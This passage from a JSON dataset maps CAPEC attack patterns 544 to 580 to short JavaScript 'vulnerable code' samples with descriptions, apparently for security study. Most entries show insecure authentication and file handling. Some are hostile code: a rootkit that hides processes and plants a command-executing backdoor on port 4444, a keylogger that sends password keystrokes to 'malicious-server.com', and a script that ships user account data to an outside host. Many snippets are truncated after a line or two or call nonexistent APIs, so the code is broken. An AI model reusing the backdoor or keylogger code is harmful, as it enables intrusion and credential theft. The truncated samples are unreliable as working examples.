        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "`\n    class SupplyChainConnector {\n        constructor(supplierUrl) {\n            this.supplierUrl = supplierUrl;\n            this.trustedCerts = [];",
        "description": "\"This vulnerable code represents a supply chain attack vector where a component downloader accepts connections without proper certificate validation, doesn't verify the authenticity of the source, and executes downloaded components without verification. It demonstrates multiple security issues including improper certificate validation (CWE-295), blind trust in external sources, and unsafe execution of downloaded content. The code also lacks proper destination verification (CWE-941) and relies on security through obscurity (CWE-656) by not implementing proper security controls.\""
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "`\n    class SecureDevice {\n      constructor() {\n        this.sensitiveData = new Uint8Array(32);\n        this.cryptoKeys = new Uint8Array(16);\n        this.debugMode = false;",
        "description": "\"This code represents a vulnerable device management system that fails to properly clear sensitive data during debug mode, decommissioning, and memory transitions. It retains sensitive information in memory registers, exposes trace data, and lacks proper data scrubbing mechanisms, making it susceptible to data recovery attacks through hardware analysis and debugging interfaces.\""
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "class CloudStorage {\n    constructor() {\n        this.storage = {};\n        this.tenants = new Set();\n    }\n\n    allocateStorage(tenantId, data) {\n        this.storage[tenantId] = data;\n        this.tenants.add(tenantId);\n    }\n\n    deleteTenant(tenantId) {\n        // Vulnerable: Incomplete data deletion\n        delete this.storage[tenantId];\n        this.tenants.delete(tenantId);\n        // Memory still contains the data\n    }\n\n    reallocateStorage(newTenantId) {\n        let storageBlock = Buffer.alloc(1024);\n        // Vulnerable: Previous tenant data might still be accessible\n        storageBlock = this.storage[Object.keys(this.storage)[0]];\n        return storageBlock;\n    }\n\n    debugDump() {\n        // Vulnerable: Exposes all tenant data in cleartext\n        console.log(JSON.stringify(this.storage));\n    }\n}",
        "description": "This code demonstrates a vulnerable cloud storage system that fails to properly sanitize data when deallocating resources from previous tenants. It doesn't properly clear sensitive information before reallocation, stores data in cleartext, and lacks proper access controls for debug information. When storage is reallocated to new tenants, remnants of previous tenant data may still be accessible."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "`class SecureDevice {\n    constructor(data) {\n        this.sensitiveData = data;\n        this.isDestroyed = false;",
        "description": "\"This code demonstrates multiple vulnerabilities related to physical attacks and data protection. It includes incomplete data removal (CWE-1301), lack of protection against physical side-channel attacks (CWE-1300), problematic self-destruction (CWE-1082), and improper virtual method implementation without virtual destructor (CWE-1087). The processSensitiveOperation method is particularly vulnerable to power analysis attacks.\""
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "`\n    class DataSystem {\n      constructor() {\n        this.sensitiveData = [];\n        this.classificationLevel = 'public';",
        "description": "\"This code demonstrates multiple security vulnerabilities including cleartext transmission of sensitive data, improper data cleanup, lack of access controls, and potential data spillage across classification levels. The system processes and stores sensitive information without proper security controls, transmits data over insecure channels, and fails to properly sanitize data before reuse or sharing.\""
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "// Remote code execution via dynamic script loading\nfunction loadExternalScript(url) {\n    let script = document.createElement('script');\n    script.src = url;\n    document.head.appendChild(script);\n}\n\n// Load potentially malicious code without verification\nfunction initializeAnalytics() {\n    loadExternalScript('http://analytics-cdn.example.com/tracker.js');\n    \n    // Nested reentrant call to initialization\n    setTimeout(() => {\n        if(!window.analyticsLoaded) {\n            initializeAnalytics();\n        }\n    }, 1000);\n}\n\n// Optimization-sensitive security check that could be removed\nfunction verifyExecution() {\n    let securityToken = '12345';\n    while(securityToken.length > 0) {\n        // Security-critical loop that might be optimized away\n        securityToken = securityToken.substring(1);\n    }\n    return true;\n}\n\ninitializeAnalytics();",
        "description": "A vulnerable code implementation that loads external JavaScript from an untrusted source without integrity verification, includes nested reentrant calls that could cause stack overflow, and contains security checks that might be optimized away by the JavaScript engine. The code demonstrates multiple security weaknesses including unverified code execution, potential malicious code inclusion, and unreliable security checks."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "`\nconst fs = require('fs');\nconst registry = require('winreg');\n\nfunction installMaliciousService() {\n  const regKey = new registry({\n    hive: registry.HKLM,\n    key: '\\\\\\\\SYSTEM\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\WindowsUpdate'",
        "description": "\"This code demonstrates a vulnerable service installation that creates a Windows service with elevated privileges, using insecure defaults and masquerading as a legitimate Windows Update service. It uses default credentials, sets overly permissive file permissions, and runs with SYSTEM privileges without proper access controls.\""
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "`\nconst serviceManager = {\n    services: {",
        "description": "\"A vulnerable service management implementation that allows unauthorized service manipulation, stores credentials in plaintext, executes unvalidated configurations, and uses uninitialized resources. The code demonstrates improper access control, insufficient credential protection, and unsafe system configuration management.\""
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\nconst hideProcess = {\n    originalListFunc: process.listProcesses,\n    init: function() {\n        // Hook system API calls\n        process.listProcesses = function() {\n            const processes = hideProcess.originalListFunc();\n            return processes.filter(proc => !proc.name.includes('malware'));\n        };\n\n        // Create hidden directory\n        const hiddenDir = '/usr/lib/.hidden';\n        if (!fs.existsSync(hiddenDir)) {\n            fs.mkdirSync(hiddenDir, { recursive: true });\n        }\n\n        // Install backdoor\n        const backdoor = `\n            const net = require('net');\n            const server = net.createServer(socket => {\n                socket.on('data', data => {\n                    require('child_process').exec(data.toString(), (error, stdout) => {\n                        socket.write(stdout);\n                    });\n                });\n            });\n            server.listen(4444);\n        `;\n\n        fs.writeFileSync(hiddenDir + '/service.js', backdoor);\n        require('child_process').spawn('node', [hiddenDir + '/service.js'], {\n            detached: true,\n            stdio: 'ignore'\n        }).unref();\n    }\n};",
        "description": "This code demonstrates a rootkit-like functionality that hooks into system API calls to hide malicious processes, creates hidden directories, and installs a backdoor that allows remote command execution. It modifies system functionality to conceal its presence and provides unauthorized access through a covert channel."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "// Client-side security validation\nclass PaymentProcessor {\n    constructor() {\n        this.isAdmin = false;\n    }\n\n    validatePayment(amount) {\n        // Vulnerable: Client-side only validation\n        if(amount > 1000 && !this.isAdmin) {\n            return false;\n        }\n        return true;\n    }\n\n    processPayment(amount) {\n        // Bypassing protection by directly calling process\n        if(this.validatePayment(amount)) {\n            // Direct access to critical function\n            this.sendToServer(amount);\n        }\n    }\n\n    // Exposed low-level functionality\n    sendToServer(amount) {\n        fetch('api/process-payment', {\n            method: 'POST',\n            body: JSON.stringify({ amount: amount })\n        });\n    }\n\n    // Easily bypassed protection\n    setAdmin() {\n        this.isAdmin = true;\n    }\n}",
        "description": "This code demonstrates vulnerable security implementation by relying on client-side validation and protection mechanisms that can be easily bypassed. The payment processing system uses client-side checks that can be circumvented by directly accessing lower-level functions or modifying client-side variables. The security controls can be bypassed by calling sendToServer() directly or manipulating the isAdmin flag, effectively rendering the protection mechanism useless."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(express.json());\napp.use(session({\n  secret: 'fixed-secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { maxAge: 365 * 24 * 60 * 60 * 1000 } // 1 year expiration\n}));\n\nconst users = {\n  admin: 'simple123',\n  user: 'password'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  \n  if (users[username] && users[username] === password) {\n    req.session.authenticated = true;\n    req.session.user = username;\n    res.json({ success: true });\n  } else {\n    res.status(401).json({ success: false });\n  }\n});\n\napp.get('/admin-panel', (req, res) => {\n  if (req.session.authenticated) {\n    res.json({ data: 'sensitive admin data' });\n  } else {\n    res.status(401).json({ error: 'Unauthorized' });\n  }\n});",
        "description": "This code demonstrates multiple authentication vulnerabilities including single-factor authentication, weak password storage (plaintext), no password aging mechanism, weak password requirements, and a session management system that maintains long-lived sessions. The credentials are stored in plaintext and there's no protection against replay attacks. The session secret is hardcoded and the cookie expiration is set to one year, making it susceptible to session hijacking."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction openUserFile(userInputPath) {\n    // No validation of file extension or path\n    const filePath = path.join(__dirname, userInputPath);\n    \n    // Vulnerable file handler association\n    const fileExt = path.extname(filePath);\n    const handlers = {\n        '.txt': 'notepad.exe',\n        '.doc': 'winword.exe',\n        '.pdf': 'acrobat.exe'\n    };\n\n    // Directly use user input to determine program handler\n    const handler = handlers[fileExt] || 'default.exe';\n    \n    // Unsafe file opening without checking if file handler is trusted\n    const fileDescriptor = fs.openSync(filePath, 'r');\n    \n    // Execute file with associated handler\n    require('child_process').execSync(`${handler} \"${filePath}\"`);    \n    \n    // File descriptor not properly closed\n    return fileDescriptor;\n}",
        "description": "This code demonstrates vulnerable file handler manipulation by accepting unchecked user input for file paths, blindly trusting file extensions to determine handlers, and executing files with potentially malicious handlers. It also shows improper file descriptor management and lacks proper access control verification."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "// Legacy authentication system using deprecated functions\nfunction authenticateUser(username, password) {\n    // Using deprecated escape() function\n    const encodedUser = escape(username);\n    const encodedPass = escape(password);\n    \n    // Using obsolete synchronous XMLHttpRequest\n    const xhr = new XMLHttpRequest();\n    xhr.open('POST', '/auth', false);\n    xhr.send(JSON.stringify({\n        user: encodedUser,\n        pass: encodedPass\n    }));\n    \n    // Using eval to parse response (unsafe runtime execution)\n    const response = eval('(' + xhr.responseText + ')');\n    \n    // Using deprecated localStorage without encryption\n    localStorage.setItem('auth_token', response.token);\n    \n    return response.authenticated;\n}",
        "description": "This code demonstrates multiple deprecated and insecure practices including the use of obsolete functions (escape()), synchronous XMLHttpRequest, eval() for runtime execution, and unprotected data storage. It relies on runtime components and fails to protect stored data, making it vulnerable to various attacks."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "`\nconst fs = require('fs');\nconst { exec",
        "description": "\"This code demonstrates a vulnerable executable replacement scenario where an attacker can provide a malicious executable path through command-line arguments. The code lacks proper access control, executable validation, and command injection protection, allowing an attacker to replace and execute malicious code in place of a legitimate updater.\""
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "class SatelliteComm {\n    constructor(frequency, coordinates) {\n        this.frequency = frequency;\n        this.coordinates = coordinates;\n        this.authKey = 'default_key';\n    }\n\n    establishUplink() {\n        // Vulnerable: No verification of uplink source\n        return new Promise((resolve) => {\n            this.channel = {\n                isOpen: true,\n                transmit: (data) => {\n                    // Vulnerable: No message integrity checks\n                    this.sendData(data);\n                }\n            };\n            resolve(true);\n        });\n    }\n\n    sendData(data) {\n        // Vulnerable: No protection against overlapping transmission ranges\n        const payload = {\n            data: data,\n            timestamp: Date.now(),\n            coordinates: this.coordinates\n        };\n        \n        // Vulnerable: Broadcasting without endpoint verification\n        this.broadcast(payload);\n    }\n\n    broadcast(payload) {\n        // Vulnerable: No verification of destination endpoints\n        if (this.channel && this.channel.isOpen) {\n            console.log(`Broadcasting on frequency ${this.frequency}`);\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates a vulnerable satellite communication system that lacks proper authentication, message integrity checks, and endpoint verification. It allows unauthorized transmission, doesn't verify the source of uplink signals, and fails to protect against overlapping transmission ranges. The implementation enables potential jamming attacks by allowing unverified broadcasts on specific frequencies."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "// User authentication system\nconst users = {\n  'admin': 'password123',\n  'user1': 'welcome'\n};\n\nfunction authenticate(username, password) {\n  // Store credentials in plaintext\n  localStorage.setItem('savedUsername', username);\n  localStorage.setItem('savedPassword', password);\n\n  // No rate limiting for login attempts\n  if (users[username] === password) {\n    // Single factor authentication only\n    return true;\n  }\n  return false;\n}\n\n// No password expiration or complexity requirements\nfunction createUser(username, password) {\n  users[username] = password;\n}\n\n// Shared credentials across multiple services\nconst sharedServiceToken = 'global_access_token_123';\nfunction authenticateAllServices() {\n  return sharedServiceToken;\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including plaintext credential storage, lack of brute force protection, single-factor authentication, weak password management, and shared credentials across services. The code stores sensitive information in localStorage, has no login attempt limits, uses simple password comparison, lacks password aging mechanisms, and implements shared authentication tokens."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "// Authentication configuration and login logic\nconst config = {\n    allowedAttempts: Infinity,\n    passwordMinLength: 4,\n    passwordExpiration: null,\n    sessionTimeout: null\n};\n\nfunction authenticateUser(username, password) {\n    // Store credentials in plain text\n    const credentials = {\n        admin: 'admin123',\n        user: 'password'\n    };\n    \n    if (credentials[username] === password) {\n        // Basic token without encryption\n        const token = btoa(username + ':' + password);\n        localStorage.setItem('auth_token', token);\n        return true;\n    }\n    return false;\n}\n\nfunction checkAdminShare(token) {\n    // No secondary verification, just basic token check\n    const storedToken = localStorage.getItem('auth_token');\n    if (token === storedToken) {\n        return 'Access granted to admin shares';\n    }\n    return 'Access denied';\n}",
        "description": "This vulnerable code demonstrates weak authentication mechanisms for accessing Windows Admin Shares. It implements single-factor authentication, stores credentials in plain text, lacks password complexity requirements, has no password aging mechanism, and is susceptible to replay attacks due to basic token storage in localStorage without encryption or expiration."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processSharedFile(filePath) {\n    const tempDir = '/tmp/shared/';\n    if (!fs.existsSync(tempDir)) {\n        fs.mkdirSync(tempDir, { mode: 0o777 });\n    }\n\n    const fileName = path.basename(filePath);\n    const tempFile = path.join(tempDir, fileName);\n    fs.copyFileSync(filePath, tempFile);\n\n    if (fileName.endsWith('.js')) {\n        const content = fs.readFileSync(tempFile, 'utf8');\n        eval(content);  // Executes any JavaScript content without validation\n    }\n}",
        "description": "This vulnerable code creates a shared directory with loose permissions (777) and processes files by copying them to a temporary location. It blindly executes any JavaScript files found in the shared location without verifying the source, permissions, or content integrity. The code demonstrates multiple vulnerabilities including unsafe file permissions, unrestricted file uploads, and arbitrary code execution from untrusted sources."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\n\napp.use(fileUpload());\napp.use(express.static('public'));\n\napp.post('/upload', (req, res) => {\n  if (!req.files || !req.files.file) {\n    return res.status(400).send('No file uploaded');\n  }\n\n  const uploadedFile = req.files.file;\n  const uploadPath = __dirname + '/public/' + uploadedFile.name;\n\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n    res.send('File uploaded successfully');\n  });\n});\n\napp.listen(3000);",
        "description": "This code demonstrates vulnerable file upload functionality where files are stored under the web root without proper validation of file type, content, or access controls. It allows unrestricted file upload to a publicly accessible directory, enabling execution of malicious files through the web server."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "// Login script configuration\nconst logonScript = {\n    adminPassword: 'admin123',  // Hard-coded admin password\n    userCredentials: {\n        'admin': 'superpass',\n        'system': 'syspass'\n    },\n\n    executeLoginScript: function(username) {\n        // No server-side validation, client-side only\n        if(this.userCredentials[username]) {\n            // Impersonation using elevated privileges\n            this.runWithElevatedPrivileges(() => {\n                // Malicious code inserted into logon script\n                this.modifySystemFiles();\n                this.createPersistentBackdoor();\n                this.bypassFirewall();\n            });\n        }\n    },\n\n    runWithElevatedPrivileges: function(callback) {\n        // No proper access control checks\n        callback();\n    },\n\n    modifySystemFiles: function() {\n        // Modify system files with elevated privileges\n    },\n\n    createPersistentBackdoor: function() {\n        // Create persistent access\n    },\n\n    bypassFirewall: function() {\n        // Bypass firewall rules\n    }\n};\n\nlogonScript.executeLoginScript('admin');",
        "description": "This code demonstrates a vulnerable logon script implementation with hard-coded credentials, improper access controls, client-side-only authentication, and dangerous impersonation capabilities. The script can be modified to execute malicious code with elevated privileges during user login, enabling persistence and lateral movement."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "`const loginSystem = {\n    maxAttempts: 5,\n    lockoutTime: 30000, // only 30 seconds lockout\n    attempts: {",
        "description": "\"This vulnerable code implements a basic authentication system that is susceptible to password spraying attacks. It has several security issues: weak passwords allowed, short lockout duration, simple single-factor authentication, and a predictable lockout mechanism that resets too quickly. The code allows common passwords and doesn't implement password aging or complexity requirements.\""
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "const crypto = require('crypto');\n\nclass UserAuth {\n    constructor() {\n        this.users = {};\n    }\n\n    hashPassword(password) {\n        // Vulnerable: Using hash without salt\n        return crypto.createHash('md5').update(password).digest('hex');\n    }\n\n    hashPasswordWithPredictableSalt(password) {\n        // Vulnerable: Using predictable salt\n        const salt = 'static_salt_123';\n        return crypto.createHash('md5').update(password + salt).digest('hex');\n    }\n\n    registerUser(username, password) {\n        const hashedPassword = this.hashPassword(password);\n        this.users[username] = hashedPassword;\n    }\n\n    authenticateUser(username, password) {\n        const hashedAttempt = this.hashPassword(password);\n        return this.users[username] === hashedAttempt;\n    }\n}",
        "description": "This code demonstrates vulnerable password hashing implementations including use of MD5 hash without salt (CWE-759) and with a predictable salt (CWE-760). The authentication system stores and verifies passwords using these insecure methods, making it susceptible to rainbow table attacks and password cracking."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "function authenticateUser(username, password) {\n  // Using obsolete crypto function\n  const hash = require('crypto').createHash('md5');\n  const hashedPassword = hash.update(password).digest('hex');\n\n  // Using deprecated DNS lookup for authentication\n  const dns = require('dns');\n  dns.lookup('auth.legacy-server.com', (err, address) => {\n    if (!err) {\n      // Using obsolete data storage\n      const data = Buffer.from(password).toString('base64');\n      localStorage.setItem('user_creds', data);\n\n      // Using deprecated authentication method\n      if (hashedPassword === storedHash) {\n        return true;\n      }\n    }\n  });\n}",
        "description": "This code demonstrates multiple deprecated and obsolete security practices including: using MD5 for password hashing, relying on DNS lookups for authentication decisions, storing sensitive data in localStorage without encryption, and using outdated authentication methods. The code combines multiple deprecated security weaknesses that could lead to authentication bypass and data exposure."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "// Simple keylogger implementation\nlet keystrokes = [];\nlet passwordField = document.getElementById('password');\nlet loginBtn = document.getElementById('login');\n\npasswordField.addEventListener('keydown', function(e) {\n    keystrokes.push(e.key);\n    // Send captured keystrokes to attacker's server\n    if (keystrokes.length >= 8) {\n        fetch('http://malicious-server.com/log', {\n            method: 'POST',\n            body: JSON.stringify({\n                'captured': keystrokes.join(''),\n                'timestamp': new Date().getTime()\n            })\n        });\n    }\n});\n\nloginBtn.addEventListener('click', function() {\n    // Hard-coded credentials for testing\n    const USERNAME = 'admin';\n    const PASSWORD = '12345';\n    \n    let inputPassword = passwordField.value;\n    \n    if(inputPassword === PASSWORD) {\n        localStorage.setItem('auth_token', 'Basic ' + btoa(USERNAME + ':' + PASSWORD));\n        window.location.href = '/dashboard';\n    }\n});",
        "description": "This code implements a keylogger that captures keystrokes from a password field and sends them to a malicious server. It also includes weak authentication using hard-coded credentials and stores them insecurely in localStorage. The code transmits captured credentials without encryption and implements weak password validation."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "const credentials = {\n    username: process.env.SYSTEM_USER,\n    password: process.env.SYSTEM_PASS\n};\n\nconst logUserActions = async (req, res, next) => {\n    const data = {\n        timestamp: new Date().toISOString(),\n        userInput: req.body,\n        credentials: credentials,\n        keystrokes: req.headers['user-keystrokes'],\n        sessionData: req.session\n    };\n\n    fs.appendFileSync('user_activity.log', JSON.stringify(data) + '\\n', {\n        encoding: 'utf8',\n        mode: 0o666\n    });\n    next();\n};\n\napp.use(logUserActions);",
        "description": "This vulnerable code implements a middleware that logs sensitive user data including keystrokes, session information, and system credentials into an unsecured log file. The code exposes sensitive system information through environment variables, stores credentials in plaintext, and creates logs with permissive file permissions that could be accessed by unauthorized users."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "function authenticateUser(username, password) {\n  try {\n    // Using deprecated DNS lookup for authentication\n    dns.lookup(username + '.auth.legacy-server.com', function(err, address) {\n      if (address) {\n        // Using obsolete encryption function\n        var encryptedPass = escape(password);\n        \n        // Unchecked error conditions\n        validateCredentials(username, encryptedPass);\n        \n        // No error handling or verification of authentication result\n        return true;\n      }\n    });\n  } catch(e) {\n    // Silently failing without proper error handling\n  }\n}",
        "description": "This code demonstrates multiple deprecated and vulnerable authentication practices including use of obsolete functions (escape), unchecked error conditions, improper error handling, and insecure DNS-based authentication decisions."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "const log = {\n  server: 'logging.company.com',\n  credentials: {\n    username: 'logger',\n    password: 'secret123'\n  },\n  send: function(message) {\n    if(!this.connected) {\n      console.log('Failed to send log, connection lost');\n      return;\n    }\n    const sensitiveData = {\n      userToken: getCurrentUser().token,\n      sessionId: getCurrentSession().id,\n      serverVersion: process.env.VERSION,\n      gitCommit: process.env.GIT_HASH\n    };\n    const logData = {\n      timestamp: new Date().toISOString(),\n      details: message,\n      ...sensitiveData,\n      raw: JSON.stringify(message)\n    };\n    fetch(this.server + '/logs', {\n      method: 'POST',\n      body: JSON.stringify(logData),\n      headers: {\n        'Authorization': 'Basic ' + btoa(this.credentials.username + ':' + this.credentials.password)\n      }\n    }).catch(() => {\n      this.connected = false;\n    });\n  }\n};",
        "description": "This vulnerable logging implementation contains multiple security issues: it exposes sensitive information in logs including session tokens and version control data, uses basic authentication that's susceptible to replay attacks, fails to properly handle logging failures, includes excessive data in logs, and has no retry mechanism when log delivery fails. The code demonstrates how an attacker could prevent logs from reaching the central server by simply causing a connection failure, while also gaining access to sensitive information through the logs."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "`\nconst fs = require('fs');\nconst path = require('path');\n\nfunction handleFileUpload(filePath, data) {\n    // No file extension validation\n    let fileDescriptors = [];\n    \n    // Unlimited file descriptor allocation\n    while(true) {\n        try {\n            let fd = fs.openSync(filePath, 'a+');\n            fileDescriptors.push(fd);\n            \n            // Write data without size checks or decompression validation\n            let decompressedData = decompress(data);\n            fs.writeFileSync(filePath, decompressedData, { flag: 'a'",
        "description": "\"This code demonstrates multiple vulnerabilities including unrestricted file uploads, unlimited file descriptor allocation, unsafe handling of compressed data, and improper handling of alternate data streams. It allows arbitrary data to be appended to files without proper validation or limits, potentially leading to resource exhaustion and denial of service.\""
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "const processInfo = {\n    listProcesses: () => {\n        const processes = require('child_process');\n        return processes.execSync('ps aux', {\n            encoding: 'utf8',\n            maxBuffer: 50 * 1024 * 1024\n        });\n    },\n    getProcessDetails: (pid) => {\n        const fs = require('fs');\n        try {\n            const cmdline = fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8');\n            const environ = fs.readFileSync(`/proc/${pid}/environ`, 'utf8');\n            return {\n                commandLine: cmdline,\n                environment: environ,\n                pid: pid\n            };\n        } catch(e) {\n            return null;\n        }\n    }\n};\n\nconsole.log(processInfo.listProcesses());\nconst targetPid = 1234;\nconsole.log(processInfo.getProcessDetails(targetPid));",
        "description": "This vulnerable code retrieves and exposes sensitive process information without proper authorization checks. It uses system commands and direct file system access to gather detailed information about running processes, including command-line arguments and environment variables, which could contain sensitive data. The code doesn't implement any access controls or sanitization, potentially exposing system-level information to unauthorized users."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "`\nconst { exec",
        "description": "\"This code exposes sensitive system service information through an HTTP endpoint without any authentication. It uses child_process.exec to run system commands that reveal service information, stores this sensitive data in a global variable, and makes it accessible to any client that connects to the server. The code demonstrates multiple vulnerabilities including exposure of system information, unsafe command execution, and lack of access controls.\""
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nconst getUserInfo = async () => {\n  const commands = {\n    windows: 'net user',\n    linux: 'cat /etc/passwd',\n    domain: 'dsquery user -limit 0'\n  };\n\n  try {\n    exec(commands.windows, (error, stdout, stderr) => {\n      const userInfo = stdout;\n      // Store sensitive user information in plaintext log\n      fs.writeFileSync('user_info.log', userInfo);\n      \n      // Send user data over unencrypted connection\n      const http = require('http');\n      const req = http.request({\n        hostname: 'example.com',\n        path: '/api/users',\n        method: 'POST'\n      });\n      req.write(userInfo);\n      req.end();\n    });\n  } catch(err) {\n    console.log(err);\n  }\n};\n\ngetUserInfo();",
        "description": "This vulnerable code demonstrates exposing sensitive system account information by executing OS commands to gather user data, storing it in plaintext, and transmitting it insecurely. It uses child_process.exec without proper access controls, exposes command-line arguments, and writes sensitive data to an unprotected log file that could be accessed by unauthorized users."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "const { execSync } = require('child_process');\nconst fs = require('fs');\n\nfunction getUserGroups(username) {\n  try {\n    // Storing sensitive command output in plaintext file\n    const output = execSync(`net localgroup`, { encoding: 'utf8' });\n    fs.writeFileSync('user_groups.txt', output);\n    \n    // Exposing group information through an unprotected endpoint\n    app.get('/groups', (req, res) => {\n      const groupData = fs.readFileSync('user_groups.txt', 'utf8');\n      res.send(groupData);\n    });\n\n    // Incorrectly adding users to groups without validation\n    function addUserToGroup(user, group) {\n      execSync(`net localgroup ${group} ${user} /add`);\n    }\n\n    return output;\n  } catch (error) {\n    console.error(error);\n  }\n}",
        "description": "This code demonstrates vulnerable group management functionality by exposing sensitive group information through an unprotected endpoint, storing sensitive data in plaintext files accessible to unauthorized users, and allowing unchecked group modifications. It executes system commands with visible arguments and creates an emergent resource (text file) that could be exploited."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\nfunction getUserActivityInfo() {\n  const homeDir = os.homedir();\n  const userFiles = fs.readdirSync(homeDir);\n  \n  const userInfo = {};\n  userFiles.forEach(file => {\n    const filePath = homeDir + '/' + file;\n    try {\n      const stats = fs.statSync(filePath);\n      userInfo[file] = {\n        lastAccessed: stats.atime,\n        lastModified: stats.mtime,\n        owner: stats.uid,\n        permissions: stats.mode.toString(8)\n      };\n    } catch(err) {}\n  });\n\n  fs.writeFileSync('/tmp/user_activity.log', JSON.stringify(userInfo));\n  return userInfo;\n}",
        "description": "This code demonstrates an unsafe implementation that collects and exposes sensitive user activity information. It scans the user's home directory, collects metadata about files including access times and permissions, and writes this sensitive information to a publicly readable temporary file. This could allow unauthorized actors to gather intelligence about user behavior and system usage patterns."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "// Security monitoring system configuration\nclass SecurityMonitor {\n  constructor() {\n    this.adminPassword = 'admin123';  // Hard-coded credential\n    this.isEnabled = true;\n    this.logFile = './security.log';\n  }\n\n  disableSecurity(password) {\n    if (password === this.adminPassword) {\n      this.isEnabled = false;\n      this.clearLogs();\n      this.stopMonitoring();\n      return true;\n    }\n    return false;\n  }\n\n  clearLogs() {\n    require('fs').unlinkSync(this.logFile);\n  }\n\n  stopMonitoring() {\n    process.kill(process.pid);\n  }\n}\n\nconst monitor = new SecurityMonitor();\nmonitor.disableSecurity('admin123');",
        "description": "This code demonstrates vulnerable security monitoring implementation with hard-coded credentials, improper access control, and the ability to completely disable security features. The SecurityMonitor class allows anyone with knowledge of the hard-coded password to disable security monitoring, delete log files, and terminate the monitoring process, leaving the system exposed to attacks without any audit trail."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "\"const Registry = require('winreg');\nconst regKey = new Registry({\n    hive: Registry.HKEY_LOCAL_MACHINE,\n    key: '\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon'",
        "description": "\"This code demonstrates a vulnerability that modifies the Windows registry to load a malicious DLL at startup through Winlogon, incorporating hard-coded credentials, unsafe login functions, and improper system configuration access. It uses external control of system settings and includes dangerous impersonation capabilities.\""
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n    const userAgent = req.headers['user-agent'];\n    \n    if (req.url === '/api/checkUser') {\n        const username = req.query.username;\n        // Perform slow database lookup\n        setTimeout(() => {\n            if (userExists(username)) {\n                res.writeHead(200, {'Server': 'Apache/2.4.1', 'X-Powered-By': 'PHP/7.2'});\n                res.end('User check complete');\n            } else {\n                // Different timing for non-existent users\n                res.writeHead(404);\n                res.end('Check failed');\n            }\n        }, username.length * 100);\n    } else if (req.url === '/api/systemInfo') {\n        // Leaks system information\n        const sysInfo = {\n            os: process.platform,\n            version: process.version,\n            path: process.env.PATH,\n            modules: process.moduleLoadList\n        };\n        res.end(JSON.stringify(sysInfo));\n    }\n});\n\nserver.listen(3000);",
        "description": "This vulnerable code demonstrates information disclosure through timing attacks, system information leakage, and observable response discrepancies. It exposes internal state through different response times for user checks, reveals detailed system information, and includes server version details in headers. The timing-based user verification allows for username enumeration attacks."
    },
    {
        "capec_id": "581",
